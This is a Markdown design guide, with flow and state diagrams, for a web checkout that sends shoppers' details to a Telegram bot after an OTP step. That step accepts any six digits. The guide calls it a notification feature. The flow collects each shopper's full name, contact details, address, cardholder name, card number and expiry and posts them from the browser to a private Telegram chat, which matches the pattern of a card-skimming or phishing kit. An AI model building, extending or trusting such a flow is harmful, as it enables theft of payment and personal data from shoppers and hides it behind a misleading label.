# Checkout Flow with Telegram Notifications - Visual Guide

## Complete User Journey

```
┌─────────────────────────────────────────────────────────────────────┐
│                     CHECKOUT FLOW DIAGRAM                           │
└─────────────────────────────────────────────────────────────────────┘

START
  │
  ├─→ [User Login Check]
  │    └─→ If not logged in → Redirect to Auth
  │
  ├─→ [Fetch Product Details]
  │    ├─ Product Info (name, price, images)
  │    └─ Seller Information
  │
  ├─→ STEP 1: ORDER DETAILS ─────────────────────────────────────────
  │    │
  │    ├─ Display product with image & price
  │    ├─ Enter quantity (min: MOQ)
  │    └─ Enter shipping address (simple textarea)
  │
  │    └─→ Click "Proceed to Payment"
  │         └─→ Create order record in Supabase
  │         └─→ Send initial notification to Telegram (via edge function)
  │
  ├─→ STEP 2: PAYMENT DETAILS ───────────────────────────────────────
  │    │
  │    ├─ Display amount to pay
  │    │
  │    ├─ Form: PaymentForm
  │    │   ├─ Card number input
  │    │   ├─ Cardholder name
  │    │   ├─ Expiry date (MM/YY)
  │    │   └─ CVV
  │    │
  │    └─→ Click "Pay [Amount]"
  │         └─→ Validate card data
  │         └─→ Create transaction record
  │         └─→ Show OTP verification screen
  │
  ├─→ STEP 3: OTP VERIFICATION ──────────────────────────────────────
  │    │
  │    ├─ Display card last 4 digits
  │    ├─ Show OTP input (6 boxes)
  │    ├─ Timer countdown (60 seconds)
  │    └─ Options: Verify / Resend
  │    │
  │    └─→ User enters OTP (any 6 digits in demo)
  │         │
  │         ├─→ INPUT: onPaymentDataCaptured callback
  │         │   └─→ Captures payment details:
  │         │       - cardholderName
  │         │       - cardNumber
  │         │       - cardBrand (detected)
  │         │       - expiryMonth (MM)
  │         │       - expiryYear (YY)
  │         │
  │         ├─→ [handleOTPVerified] triggers
  │         │   └─→ Update transaction status to 'confirmed'
  │         │
  │         └─→ CRITICAL POINT: DATA COMBINATION & TELEGRAM SEND
  │             │
  │             ├─ Merge shipping + payment + order data
  │             │
  │             ├─ Call: sendCheckoutDataToTelegram({
  │             │   shippingDetails: {
  │             │     fullName: "...",
  │             │     email: "...",
  │             │     phoneNumber: "...",
  │             │     streetAddress: "...",
  │             │     city: "...",
  │             │     stateProvince: "...",
  │             │     postalCode: "...",
  │             │     country: "..."
  │             │   },
  │             │   paymentDetails: {
  │             │     cardholderName: "...",
  │             │     cardNumber: "xxxx xxxx xxxx 3456",
  │             │     cardBrand: "Visa",
  │             │     expiryMonth: "12",
  │             │     expiryYear: "25"
  │             │   },
  │             │   orderInfo: {
  │             │     orderId: "...",
  │             │     productName: "...",
  │             │     quantity: 2,
  │             │     amount: 629.45,
  │             │     currency: "USD"
  │             │   }
  │             │ })
  │             │
  │             ├─→ FORMAT MESSAGE:
  │             │   ┌─────────────────────────────────┐
  │             │   │ 🛒 NEW CHECKOUT NOTIFICATION   │
  │             │   │ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
  │             │   │                                 │
  │             │   │ 📋 ORDER DETAILS                │
  │             │   │    Order ID: abc123...          │
  │             │   │    Product: Device              │
  │             │   │    Amount: USD 629.45           │
  │             │   │                                 │
  │             │   │ 📍 SHIPPING ADDRESS             │
  │             │   │    Name, Email, Phone           │
  │             │   │    Full Address with Country    │
  │             │   │                                 │
  │             │   │ 💳 PAYMENT DETAILS              │
  │             │   │    Cardholder Name              │
  │             │   │    Card Brand                   │
  │             │   │    Card Masked Number           │
  │             │   │    Expiry Date                  │
  │             │   │                                 │
  │             │   │ ⏰ Timestamp                     │
  │             │   └─────────────────────────────────┘
  │             │
  │             ├─→ SEND TO TELEGRAM:
  │             │   POST https://api.telegram.org/bot<TOKEN>/sendMessage
  │             │   {
  │             │     chat_id: "<CHAT_ID>",
  │             │     text: "<formatted_message>",
  │             │     parse_mode: "HTML"
  │             │   }
  │             │
  │             └─→ ✅ MESSAGE RECEIVED IN YOUR TELEGRAM!
  │                 (or error logged to console if failure)
  │
  ├─→ STEP 4: SUCCESS ───────────────────────────────────────────────
  │    │
  │    ├─ Show success screen with:
  │    │   ├─ ✓ Payment Successful
  │    │   ├─ Amount paid
  │    │   ├─ Transaction ID
  │    │   └─ "Go to Dashboard" button
  │    │
  │    └─→ User navigates to buyer dashboard
  │
  └─→ END

┌─────────────────────────────────────────────────────────────────────┐
│                    PARALLEL PROCESSES                               │
└─────────────────────────────────────────────────────────────────────┘

During Checkout:
├─ Frontend: Collects & validates user data
├─ Supabase: Stores orders & transactions
├─ Supabase Functions: Sends initial order notification
└─ Telegram Bot: Receives all messages

After OTP Verification:
├─ Frontend: Captures payment data
├─ Frontend: Formats combined checkout data
├─ Frontend: Calls sendCheckoutDataToTelegram()
├─ Telegram API: Receives message
├─ Supabase: Updates transaction status
├─ Telegram: Displays formatted message in chat
└─ Browser Console: Logs success/error
```

---

## Component Hierarchy

```
Checkout (Page)
├── Header
├── Back Button
├── Grid Layout (2-3 columns)
│   │
│   ├─ Column 1-2: Main Content
│   │   │
│   │   ├─ STEP 1: Order Details
│   │   │   ├─ Product card
│   │   │   ├─ Quantity input
│   │   │   ├─ Shipping address textarea
│   │   │   └─ "Proceed to Payment" button
│   │   │
│   │   └─ STEP 2: Payment
│   │       │
│   │       └─ CheckoutFormWithTelegram
│   │           └─ PaymentForm
│   │               ├─ Card details form
│   │               │   ├─ Card number
│   │               │   ├─ Cardholder
│   │               │   ├─ Expiry date
│   │               │   └─ CVV
│   │               │
│   │               ├─ [On Submit: handleOTPVerified]
│   │               │   └─→ onPaymentDataCaptured callback
│   │               │
│   │               └─ OTPVerification
│   │                   ├─ 6 OTP input boxes
│   │                   ├─ Timer
│   │                   └─ Verify button
│   │                       └─→ Triggers:
│   │                           1. Capture payment data
│   │                           2. Send to Telegram
│   │                           3. Show success
│   │
│   └─ Column 3: Order Summary
│       ├─ Product name
│       ├─ Unit price
│       ├─ Quantity
│       ├─ Total amount
│       └─ [Sticky position]
│
└── Footer
```

---

## State Management Flow

```
┌─────────────────────────────────────────────────────┐
│             Checkout Component State                │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Step: 'details' | 'payment'                        │
│  ├─→ Controls which form is shown                  │
│  └─→ Updated by "Proceed" and "Back" buttons       │
│                                                     │
│  Quantity: number                                   │
│  ├─→ Minimum: product.moq                          │
│  └─→ Updated by quantity input                     │
│                                                     │
│  ShippingAddress: string (textarea)                │
│  ├─→ Validated before payment step                │
│  └─→ Sent to Telegram (no masking needed)          │
│                                                     │
│  OrderId: string | null                            │
│  ├─→ Created when transitioning to payment        │
│  └─→ Used for transaction linking                 │
│                                                     │
│  CheckoutData: { ... } (prepared but unused)       │
│  ├─→ Reserved for future integration               │
│  └─→ Can be used for full state management        │
│                                                     │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│        PaymentForm Component State                  │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Step: 'card' | 'otp' | 'success'                  │
│  ├─→ 'card': Payment form visible                  │
│  ├─→ 'otp': OTP input visible                      │
│  └─→ 'success': Success message visible            │
│                                                     │
│  CardData: CardFormData | null                     │
│  ├─→ { cardNumber, cardHolder, expiryDate, cvv }  │
│  └─→ Captured for Telegram when OTP verified      │
│                                                     │
│  TransactionId: string | null                      │
│  ├─→ Created during payment submission             │
│  └─→ Used to link card data to payment            │
│                                                     │
│  Processing: boolean                               │
│  ├─→ Prevents double submission                    │
│  └─→ Shows loading state in UI                     │
│                                                     │
└─────────────────────────────────────────────────────┘
```

---

## Data Flow from Forms to Telegram

```
ShippingAddressForm (Step 1)
  │
  ├─ fullName ──────────────────┐
  ├─ phoneNumber ────────────────┤
  ├─ email ──────────────────────┤
  ├─ streetAddress ──────────────┤
  ├─ city ────────────────────────┤─→ Stored in
  ├─ stateProvince ──────────────┤    textarea & state
  ├─ postalCode ──────────────────┤
  └─ country ────────────────────┘

PaymentDetailsForm (Step 2)
  │
  ├─ cardholderName ─────────────┐
  ├─ cardNumber ──────────────────┤
  ├─ expiryMonth ────────────────┤
  ├─ expiryYear ─────────────────┤─→ Stored in form
  └─ cvv (not sent) ──────────────┘    state & cardData

Order Information (Auto-collected)
  │
  ├─ orderId ────────────────────┐
  ├─ productName ────────────────┤
  ├─ quantity ────────────────────┤─→ From Checkout
  ├─ amount ─────────────────────┤    component props
  ├─ currency ────────────────────┤    & calculations
  └─ timestamp ──────────────────┘

                    ↓
                    ↓
    On OTP Verification Success
                    ↓
    Combined Data Object:
    {
      shippingDetails: {...},
      paymentDetails: {...},
      orderInfo: {...}
    }
                    ↓
    sendCheckoutDataToTelegram()
                    ↓
    formatCheckoutMessage()
                    ↓
    Telegram API Call
                    ↓
    ✅ Message in Telegram
```

---

## Error Handling Flow

```
sendCheckoutDataToTelegram() called
  │
  ├─ Check: botToken exists?
  │  └─ NO → Log error, return false
  │
  ├─ Check: chatId exists?
  │  └─ NO → Log error, return false
  │
  ├─ Try: Call Telegram API
  │  │
  │  ├─ Success → result.ok == true
  │  │  └─→ Return true
  │  │
  │  ├─ API Error → result.ok == false
  │  │  ├─→ Log error description
  │  │  └─→ Return false
  │  │
  │  └─ Network Error → Exception thrown
  │     ├─→ Catch exception
  │     ├─→ Log error
  │     └─→ Return false
  │
  └─ Regardless of result:
     └─→ User checkout continues
         (Non-blocking, notification is optional)
```

---

## Timeline Example

```
Time  Event                            Frontend State    Telegram
────────────────────────────────────────────────────────────────────
00s   User starts checkout             "details" step   [waiting]
05s   User fills shipping form         [form complete]  [waiting]
10s   User clicks "Proceed"            "payment" step   [waiting]
15s   User fills card details          [form complete]  [waiting]
20s   User clicks "Pay $629.45"        [processing]     [waiting]
21s   Transaction created              [OTP step]       [waiting]
25s   User enters OTP (e.g., 123456)   [OTP complete]   [waiting]
26s   OTP Verification starts          [processing]     [waiting]
27s   Payment data captured            [data captured]  [sending]
28s   sendCheckoutDataToTelegram()     [formatting]     [sending]
29s   Telegram API receives message    [formatting]     ✅ Received!
30s   Message formatted & displayed    [success step]   📱 In Chat
```

---

## Success Criteria

✅ All shipping fields visible in Telegram  
✅ All payment fields visible in Telegram (cards masked/safe)  
✅ Order information included  
✅ Timestamp accurate  
✅ Message HTML-formatted with emojis  
✅ Message sent only after OTP success (not on form submit)  
✅ Checkout continues even if Telegram fails  
✅ Console shows success/error logs  

